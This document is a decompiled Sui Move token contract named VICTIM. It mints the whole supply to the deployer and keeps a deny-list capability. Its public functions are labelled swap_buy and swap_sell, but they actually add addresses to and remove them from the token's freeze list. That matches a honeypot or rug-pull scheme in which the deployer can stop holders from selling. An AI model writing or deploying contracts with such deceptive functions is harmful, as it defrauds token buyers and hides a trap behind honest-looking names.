module 0xa1f4a47e2753de400eb36fda1cd910dd95686da1020cdde328e4b98ab98e56db::victim {
    struct VICTIM has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: VICTIM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<VICTIM>(arg0, 9, b"VICTIM", b"Victims of Pump Fun", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qme7CjDtP6vKjyFap8btBW5SSr43KF7GR7xg2WFNuxLe5p"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<VICTIM>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<VICTIM>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<VICTIM>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<VICTIM>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<VICTIM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<VICTIM>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<VICTIM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<VICTIM>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

